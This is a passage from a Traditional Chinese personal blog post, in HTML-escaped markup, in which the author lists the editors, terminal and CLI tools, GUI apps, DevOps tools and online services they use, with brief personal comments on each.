&lt;li&gt;大學有陣子在碰資安相關的東西，所以會拿來做一些資訊安全相關的測試，最近幾年也比較少用了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.digitalocean.com/"&gt;Digital Ocean&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概 2015 年開始使用的，但真正開始使用是在工作後，因為在學校沒主機了，所以就租個 VPS 來用，每個月 10 美金，算滿夠用的。  &lt;/li&gt;
&lt;li&gt;雖然貌似比 Linode, Vultr 還貴，但使用上也沒啥太大的問題，所以也懶得換了就是。  &lt;ul&gt;
&lt;li&gt;結果才過沒幾天，2018/01/17 Digital Ocean 就推出了新方案，一個月 10 美金變成有 2 GB RAM, 1 vCPU, 50 GB SSD, 2TB Bandwidth，直接變得比 Linode 和 Vultr 還便宜了：&lt;a href="https://blog.digitalocean.com/new-droplet-plans/"&gt;Kicking Off the New Year with New Droplet Plans&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這間公司的文件都寫得滿用心的，因為有專門聘請寫手來寫，滿推薦的。  &lt;/li&gt;
&lt;li&gt;拿來放些自動化的程式，例如：  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/ad375e227ec0f1ba450915df65433473"&gt;批踢踢每天定時登入&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS"&gt;一個每小時爬 RSS feed 然後發 Tweet 的 Twitter Bot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;之前寫&lt;a href="https://github.com/M157q/ptt_statistics"&gt;批踢踢網頁版爬蟲&lt;/a&gt;時有放在上面跑  &lt;/li&gt;
&lt;li&gt;之前找租屋處的時候，寫了一個 &lt;a href="https://github.com/M157q/5g1"&gt;591 租屋網的爬蟲&lt;/a&gt;也有放在上面跑。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://parsecgaming.com"&gt;Parsec&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近幾天才開始使用的 Cloud Gaming service，確定可以在上面直接用 Steam 玩遊戲，Linux 也可以使用。  &lt;/li&gt;
&lt;li&gt;可以讓你像 Steam In-Home 一樣設定自己的主機，也可以直接讓你租 AWS 或 Paperspace 的 GPU 主機來用，費用我覺得算 OK，依照分鐘收費。  &lt;/li&gt;
&lt;li&gt;租用雲端主機適合沒辦法或沒錢或沒地方或不想組 Windows 遊戲主機的人使用，但網路速度要夠快，不然 latency 可能會有點高。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Editors&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.vim.org/"&gt;Vim&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;大概從 2008 年開始用到現在，赫然發現也快 10 年了。  &lt;/li&gt;
&lt;li&gt;搭配 &lt;code&gt;Vundle&lt;/code&gt; 來安裝 Plugin，詳細的設定可以參考這個設定：&lt;a href="https://github.com/M157q/dotfiles/blob/master/vimrc#L95-L179"&gt;https://github.com/M157q/dotfiles/blob/master/vimrc#L95-L179&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://atom.io/"&gt;Atom&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Open Source 的 Text editor，有時候會開來用。  &lt;/li&gt;
&lt;li&gt;有滿多的 plugin 可以裝的，但我沒有裝。之前最有名的應該是 &lt;a href="https://atom.io/packages/activate-power-mode"&gt;activate-power-mode 這個 plugin&lt;/a&gt; 吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Microsoft/vscode"&gt;https://github.com/Microsoft/vscode&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;微軟出的 Open Source edtior，有時候會開來用。  &lt;/li&gt;
&lt;li&gt;基本上我覺得是抄 atom 的就是，但有多出更多功能。  &lt;/li&gt;
&lt;li&gt;有一個我最喜歡的功能是可以在 editor 裡頭直接開 terminal 來用，我覺得很方便，然後&lt;a href="https://github.com/Microsoft/vscode/issues/143"&gt;這個功能是一位台灣人去提的&lt;/a&gt;。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Terminal&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/bash/"&gt;urxvt-unicode&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一款 terminal emulator，類似 macOS 上的 iTerm 或 iTerm2。  &lt;/li&gt;
&lt;li&gt;搭配這份設定檔：&lt;a href="https://github.com/M157q/dotfiles/blob/master/Xresources"&gt;https://github.com/M157q/dotfiles/blob/master/Xresources&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zsh.org/"&gt;Zsh&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;以前是使用 bash，後來預設的 shell 改成 zsh，主要是補完功能以及支援非 ASCII 比較完整。  &lt;/li&gt;
&lt;li&gt;搭配 &lt;a href="http://ohmyz.sh/"&gt;oh-my-zsh&lt;/a&gt; 針對不同的 OS 安裝不同的 plugins 來使用，設定檔在這：&lt;a href="https://github.com/M157q/dotfiles/blob/master/zshrc"&gt;https://github.com/M157q/dotfiles/blob/master/zshrc&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/bash/"&gt;Bash&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上寫 shell script 還是會寫 bash 就是，管 server 的時候大多數 Linux server 也都是 bash。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;CLI Tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/software/screen/"&gt;screen&lt;/a&gt; &amp;amp; &lt;a href="http://bxr.su/OpenBSD/usr.bin/tmux/"&gt;tmux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這兩個指令基本上拿來做相同的事，可以在一個 terminal 裏面開多個分頁。  &lt;/li&gt;
&lt;li&gt;除了方便管理以外，在遇到某些程式要跑很久的時候也很好用，可以把該程式掛在某個分頁，然後再另外開一個分頁去做其他事，不用等到程式跑完。  &lt;/li&gt;
&lt;li&gt;screen 和 tmux 各有擁護者，偶爾會見到兩派使用者開戰。  &lt;/li&gt;
&lt;li&gt;但我自己是開 screen 再在每個 screen 的分頁裏面開 tmux，這樣我覺得很好管理，比如說在不同的 project 開發的話，我就會一個 project 用一個 screen。因為如果在 screen 裏面再開 screen 或 tmux 裏面再開 tmux 的話，會沒辦法控制到裏面那層。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://hisham.hm/htop/"&gt;htop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以拿來監控系統資源的工具  &lt;/li&gt;
&lt;li&gt;我通常都是開著掛在 &lt;code&gt;tmux&lt;/code&gt; 的第一個分頁  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sindresorhus/speed-test"&gt;speed-test&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;直接在 CLI 測網路速度，不用開 SpeedTest 的網頁，挺方便的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://geoff.greer.fm/ag/"&gt;ag&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;名字叫 The Silver Searcher  &lt;/li&gt;
&lt;li&gt;類似 &lt;code&gt;grep&lt;/code&gt; 和 &lt;code&gt;ack&lt;/code&gt; 的工具，但效能比較好，要下指令也很方便，只有 &lt;code&gt;ag&lt;/code&gt; 兩個字。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://virtualenv.pypa.io/en/stable/"&gt;virtualenv&lt;/a&gt; + &lt;a href="https://virtualenvwrapper.readthedocs.io/en/latest/"&gt;virtualenvwrapper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為很常用 Python，然後裝東西的時候又不想影響到系統用的 Python，所以就會使用 virtualenv 來把環境隔開。  &lt;/li&gt;
&lt;li&gt;搭配 virtualenvwrapper 可以用更簡單的指令一次處理數個 virtualenv 的指令，挺方便的。  &lt;/li&gt;
&lt;li&gt;例如要新增一個新的 virtualenv 的話，只要 &lt;code&gt;mkvirtualenv py2 --python=python2&lt;/code&gt; 這樣就行了。  &lt;/li&gt;
&lt;li&gt;我自己基本上都是切成 &lt;code&gt;py2&lt;/code&gt;, &lt;code&gt;py3&lt;/code&gt; 來使用，然後各個用 Python 的專案也都會有各自的 virutalenv。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://wicd.sourceforge.net/"&gt;wicd &amp;amp; wicd-curses&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;wicd 的 CLI 介面，我都用這個來選擇無線網路。  &lt;/li&gt;
&lt;li&gt;如果是圖形化介面的話則有 wicd-gtk 可以使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.gnome.org/NetworkManager/"&gt;NetworkManager&lt;/a&gt; &amp;amp; &lt;a href="https://developer.gnome.org/NetworkManager/stable/nmcli.html"&gt;nmcli&lt;/a&gt; &amp;amp; &lt;a href="https://developer.gnome.org/NetworkManager/stable/nmtui.html"&gt;nmtui&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;wicd 遇到會重導向到 Login 頁面的 Public Wi-Fi 常常會連 IP 都拿不到，但 NetworkManager 往往對付這種 Public Wi-Fi 都可以順利拿到 IP，所以我會在這時候使用 &lt;code&gt;nmcli&lt;/code&gt; 或 &lt;code&gt;nmtui&lt;/code&gt; 去操控 NetworkManager。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.alsa-project.org/main/index.php/Main_Page"&gt;alsamixer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來調整 ALSA 裝置的音量，操控挺容易的，也有基於文字的圖形化介面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Bluetooth"&gt;bluetoothctl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用指令來管理藍牙裝置  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rg3/youtube-dl/"&gt;youtube-dl&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://rg3.github.io/youtube-dl/"&gt;http://rg3.github.io/youtube-dl/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;下載影片跟音樂的神器  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/linux-pidof-get-sub-process-id-2016/"&gt;pidof&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為這篇文章才知道的：&lt;a href="https://blog.longwin.com.tw/2016/12/linux-pidof-get-sub-process-id-2016/"&gt;使用 pidof 找出此程式的所有 process id - Tsung's Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;以前找 process 都要用 &lt;code&gt;ps aux | grep xxx&lt;/code&gt; 來找，用這個指令的話只要用 &lt;code&gt;pidof xxx&lt;/code&gt; 就行了  &lt;/li&gt;
&lt;li&gt;Arch Linux User 的話可以用 &lt;code&gt;sudo pacman -S procps-ng&lt;/code&gt; 來安裝。  &lt;ul&gt;
&lt;li&gt;但我發現 &lt;code&gt;pidof&lt;/code&gt; 之前是被放在不同的 package 裡頭，所以之後有變的話，可以用 &lt;code&gt;pkgfile pidof&lt;/code&gt; 來找 &lt;code&gt;pidof&lt;/code&gt; 被包含在哪個 package 裡頭。  &lt;/li&gt;
&lt;li&gt;如果沒有 &lt;code&gt;pkgfile&lt;/code&gt; 這個指令的話，可以透過 &lt;code&gt;sudo pacman -S pkgfile&lt;/code&gt; 來安裝  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ffmpeg.org/"&gt;ffmpeg&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;影音轉檔神器，也可以做到裁切、截圖等等的後續處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/traviscross/mtr"&gt;mtr&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來查路由的神器，方便易用，比 &lt;code&gt;traceroute&lt;/code&gt; 好用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;GUI Tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wicd.sourceforge.net/"&gt;wicd-gtk&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為 &lt;code&gt;wicd-curses&lt;/code&gt; 有些 bug，例如遇到新的且需要輸入密碼的 SSID 時會無法設定密碼，所以偶爾會用到 &lt;code&gt;wicd-gtk&lt;/code&gt;，顧名思義，就是 GTK 介面的 wicd。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://freedesktop.org/software/pulseaudio/pavucontrol/"&gt;PulseAudio Volume Control&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;指令為 &lt;code&gt;pavucontrol&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;alsamixer&lt;/code&gt; 的功能在普通使用下算夠用，但比較複雜的操作就會顯得麻煩了點，這時候 &lt;code&gt;pavucontrol&lt;/code&gt; 就派上用場了。  &lt;/li&gt;
&lt;li&gt;可以把輸出和輸入合併為一個音源，大概就像 macOS 上的 SoundFlower 那樣。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wugh.github.io/posts/2015/01/linux-pulse-mix-mic-and-computer-audio/"&gt;Linux通过Pulse混合麦克风和音频输出 — Life in a Nutshell&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.lxde.org/en/PCManFM"&gt;PCManFM&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;由台灣人 PCMan 撰寫的開源檔案瀏覽器，嗯，就是那位撰寫瀏覽 BBS 程式 PCMan 的 PCMan （真繞口）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.chromium.org/"&gt;Chromium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是去除了非開放原始碼部份的 Google Chrome，所以整個專案的程式碼都是公開的。  &lt;/li&gt;
&lt;li&gt;和 Google Chrome 比起來也比較輕量一些些。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mozilla.org/zh-TW/firefox/channel/desktop/"&gt;Firefox Nightly&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2017 年 10 月左右，為了先體驗 Firefox 57 的 Quantum engine 就先裝了，之後就一直使用到現在。  &lt;/li&gt;
&lt;li&gt;剛從 Firefox 55 切換過來的時候真的覺得快了不少，但後來因為使用上覺得還是有 Memory Leak 的問題，所以就比較少用了。  &lt;/li&gt;
&lt;li&gt;加上最近又出了這個問題：&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;，所以就換去使用 &lt;code&gt;qutebrowser&lt;/code&gt; 了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://qutebrowser.org/"&gt;qutebrowser&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個基於 QtWebEngine 並使用 Python 開發的開源瀏覽器。  &lt;/li&gt;
&lt;li&gt;所有的操作基本上都以 Vim 的使用習慣為主，有點類似 &lt;code&gt;dwb&lt;/code&gt;，很適合我這種 Vim user，畢竟在 Chrome, Chromium, Firefox 上我都有裝 Vimium 這個瀏覽器套件，可以讓我不太需要移動右手去使用滑鼠。  &lt;/li&gt;
&lt;li&gt;輕量化瀏覽器，比 Chrome 或 Firefox 都省資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Version Control &amp;amp; DevOps&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/"&gt;Git&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;應該不用多說了，算起來從 2012 年開始接觸，也快 6 年了。  &lt;/li&gt;
&lt;li&gt;雖然也用過 &lt;code&gt;svn&lt;/code&gt; 和 &lt;code&gt;bzr&lt;/code&gt;，但還是覺得比較習慣 &lt;code&gt;git&lt;/code&gt;。  &lt;/li&gt;
&lt;li&gt;現在連寫 blog 都用 &lt;code&gt;git&lt;/code&gt; 作版本控制了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.docker.com/"&gt;Docker&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;目前最主流的 Container 格式。  &lt;/li&gt;
&lt;li&gt;開源的部份在 2017 年改名叫 Moby 了，但大家還是習慣叫 Docker 就是。  &lt;/li&gt;
&lt;li&gt;Docker 現在專指這間公司，如果是企業版的話叫作 Docker EE，社群版的話叫作 Docker CE。  &lt;/li&gt;
&lt;li&gt;從 2016 年 4 月左右開始接觸，和 Microservices 息息相關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io/"&gt;Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Google 出的 Container 管理工具，支援 Docker 和 Rocket，類似 Docker 官方出的 Docker Swarm。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Online Services&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://mail.google.com/mail/"&gt;Gmail&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這應該不用多介紹了，雖然知道隱私會被侵犯得很嚴重，但目前還是離不開。  &lt;/li&gt;
&lt;li&gt;之後其中一個計劃應該就是換到自架的 Mail Server 吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://calendar.google.com"&gt;Google Calendar&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個應該也不用多做介紹，覺得真的不錯用，尤其以前辦社團活動的時候被成功提醒了不少次。  &lt;/li&gt;
&lt;li&gt;無論是個人、分享或團體的時間安排都挺方便的。  &lt;/li&gt;
&lt;li&gt;應該就只有比較不適合一次性使用吧。  &lt;/li&gt;
&lt;li&gt;雖然有用 iPhone，但還是沒用 Apple 的 Calendar。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://maps.google.com"&gt;Google Maps&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個應該也不用多說了，現在出門去很多人都是靠這個在導航的吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ifttt.com"&gt;IFTTT&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;IFTTT 的意思是："If it, then that."  &lt;/li&gt;
&lt;li&gt;和多家公司合作，可以很簡單設定一些跨服務的觸發條件，除了 API 提供的觸發條件以外，還可以在這之上自己撰寫 JavaScript 做一些彈性化的設定。  &lt;/li&gt;
&lt;li&gt;每個人也可以分享自己設定的腳本供他人使用，大多數都是用來做一些提醒或是自動備份的事。  &lt;/li&gt;
&lt;li&gt;我目前是拿來把我在 Twitter 分享或在 Pocket 儲存一些我覺得不錯的文章時，會幫我自動在：&lt;a href="https://github.com/M157q/m157q.github.io/issues"&gt;Issues · M157q/m157q.github.io · GitHub&lt;/a&gt; 開個新的 Issue 紀錄，以方便我日後查詢，解決常常和人分享時想起看過某篇不錯的文章卻搜尋不到的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://getpocket.com"&gt;Pocket&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用來將文章暫存以供日後閱讀的服務。  &lt;/li&gt;
&lt;li&gt;目前我的使用方式比較像是用來儲存與分類看過的文章，再加上使用了 IFTTT  的關係，說穿了其實就只是不用自己接 API，透過 IFTTT 把我看過的文章存到 GitHub Issues 而已，連搜尋也不太會在 Pocket 作搜尋。  &lt;/li&gt;
&lt;li&gt;但因為使用 Pocket 的時間早於我把文章存到 GitHub Issues 的時間，所以一些比較舊的文章還是會來 Pocket 找就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://feedly.com"&gt;Feedly&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個不錯用的 RSS Reader，目前就拿來追蹤個人與企業的技術 blog。  &lt;/li&gt;
&lt;li&gt;現在免費版的上限好像只能到 100 個來源的樣子，但我自己好像因為比較早使用，所以即便是免費版卻沒有受到這個限制。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上自己已經是每天都會使用 GitHub 了。  &lt;/li&gt;
&lt;li&gt;目前全球最大的程式碼管理平台，許多開放原始碼的專案都在上面，真的是有很多非常有趣的專案，也可以很輕易得和國外的開發者交流。  &lt;/li&gt;
&lt;li&gt;雖然大家私底下好像都戲稱成「全球最大同性交友平台」(ry  &lt;/li&gt;
&lt;li&gt;因為一掛掉就會導致很多工程師沒事幹，所以也有不少公司選擇使用 Bitbucket 或是使用 Gitlab 自己架設程式碼管理平台。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://trello.com"&gt;Trello&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一套基於「看板」(KanBan) 設計的任務管理平台，可供個人或團體使用。  &lt;/li&gt;
&lt;li&gt;我自己是用來紀錄自己做過的事情、幫自己的要做的事排定時間以及快速整理一些新學到的東西，以便之後可能可以整理成一篇文章來紀錄。個人覺得免費版就很夠用了。  &lt;/li&gt;
&lt;li&gt;最近這幾天開始使用 KanbanFlow 這套類似的工具，好處應該就是多了個番茄鐘可以幫你紀錄時間，如果是番茄鐘的愛好者且還沒使用過 Trello 的話，可以直接試試看 KanbanFlow。我自己是因為 Trello 已經紀錄不少東西了，要搬挺麻煩了，所以目前是兩個搭配使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://travis-ci.org"&gt;Travis CI&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個僅和 GitHub 作整合的 Continuous Integration 平台，目前還是 GitHub 上市佔率最大的 CI 平台。可以參考這篇 2017 年 11 月的文章：&lt;a href="https://github.com/blog/2463-github-welcomes-all-ci-tools"&gt;GitHub welcomes all CI tools · GitHub&lt;/a&gt;，列出了 GitHub 上使用的 CI 平台市佔率由多至少依序為：Travis CI, Circle Ci, Jenkins, AppVeyor, CodeShip, Drone, Semaphore CI, Buildkite, Wercker, TeamCity。  &lt;/li&gt;
&lt;li&gt;好處是所有 Public repo 都可以免費使用，而且搜尋一下就有很多設定檔可以參考。我目前是用來自動 build 並發佈我的個人部落格：&lt;a href="https://blog.m157q.tw/posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/"&gt;用 Travis CI 自動化發佈 Pelican blog 到 GitHub Pages 上 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.cloudflare.com"&gt;CloudFlare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2016 年 6 月租了自己的 domain 之後，就拿來個人使用。在這之前是因為公司的服務有在使用，所以才接觸到，覺得設計的很簡單易用且功能又很強大。  &lt;/li&gt;
&lt;li&gt;DNS 代管設定很方便，而且加上 proxy 之後就有免費的 CDN 和 HTTPS 可以使用。有很多其他的功能，可以設定 Cache、簡單的流量分析、免費的網站資安防護等等等。  &lt;/li&gt;
&lt;li&gt;詳細一點的介紹可以參考這篇文章：&lt;a href="https://blog.m157q.tw/posts/2016/09/06/i-bought-my-first-domain-name/"&gt;買了一個叫作 m157q.tw 的域名 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;不過 2017 年 2 月的時候也有出過 CloudBleed 這個大包就是：&lt;a href="https://blog.cloudflare.com/incident-report-on-memory-leak-caused-by-cloudflare-parser-bug/"&gt;Incident report on memory leak caused by Cloudflare parser bug&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gandi.net"&gt;Gandi&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為很常出現在台灣的社群會議，所以就在上面租了域名。  &lt;/li&gt;
&lt;li&gt;但我覺得使用上沒有很方便，而且因為 DNS 的管理已經被我轉到 CloudFlare 了，所以基本上只有在續租域名的時候才會開啟。  &lt;/li&gt;
&lt;li&gt;其他類似的服務有 NameCheap, GoDaddy，GoDaddy 我覺得好用一些，但也沒有認真比較過就是。  &lt;/li&gt;
&lt;li&gt;如果要用 Gandi 的服務的話，記得要開啟 "Private Domain Registration" 就是，不然個資直接被人用 &lt;code&gt;whois&lt;/code&gt; 看光光。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack.com"&gt;Slack&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;就是一個針對團隊協作而開發的平台，台灣不少新創公司與社群都有使用。  &lt;/li&gt;
&lt;li&gt;基本上就是功能更多元的 IRC 聊天室，可以整合許多 API，做到 CI, CD 的通知，甚至可以做到 ChatOps。  &lt;/li&gt;
&lt;li&gt;只是我沒有很喜歡一個 workspace 就要重新註冊一組帳號密碼的設計，但可以理解為什麼要這樣設計就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://discordapp.com"&gt;Discord&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近才開始使用的服務，主要是針對 Gamer 設計的即時語音通訊平台。  &lt;/li&gt;
&lt;li&gt;我個人是覺得像是 Slack + RaidCall，可以即時多人語音通訊（無上限），在 2017 年 11 月也開放了和好友視訊通話與螢幕畫面分享的功能（最多 10 人）。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com"&gt;Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個算新的部落格平台，乾淨簡潔無廣告，採用付費訂閱制，國外已經滿多人使用了，最近台灣也愈來愈多人使用。  &lt;/li&gt;
&lt;li&gt;我自己其實沒在使用，因為已經厭倦使用部落格平台了，一旦平台一倒的話要搬文章又是件痛苦的事。追蹤文章也是用 Feedly 去追。  &lt;/li&gt;
&lt;li&gt;至於為什麼有辦 Medium 的帳號，主要是有時候想要留言回覆，加上可以使用其他服務登入不用註冊帳號也還算方便，附加功能應該是可以幫別人的文章拍拍手（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Social Network Service  &lt;ul&gt;
&lt;li&gt;Facebook, Twitter, Line, Telegram, LinkedIn, Google+ (?)  &lt;/li&gt;
&lt;li&gt;這邊用來紀錄時代的眼淚（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Eating My Own Dog Food&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/zdict/zdict"&gt;zdict&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個 CLI 的字典查詢工具，預設支援 Linux, FreeBSD 和 macOS，也可以透過 Docker 在 Windows 上面執行。  &lt;/li&gt;
&lt;li&gt;預設是使用 Yahoo 字典，也有萌典、Urban Dictionary 等等可以查詢。  &lt;/li&gt;
&lt;li&gt;當初是在看美劇的時候常常要查單字，覺得開網頁很麻煩，所以找到了 &lt;code&gt;ydict&lt;/code&gt;，但不盡理想而且開發者也停止維護了，所以就 fork 出來大改，後來身邊也有幾個朋友加入開發，所以就弄了個 organization。  &lt;/li&gt;
&lt;li&gt;現在變成我每天會使用的工具了，之後應該會寫一篇介紹這個工具。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/gettitle"&gt;gettitle&lt;/a&gt;  &lt;ul&gt;
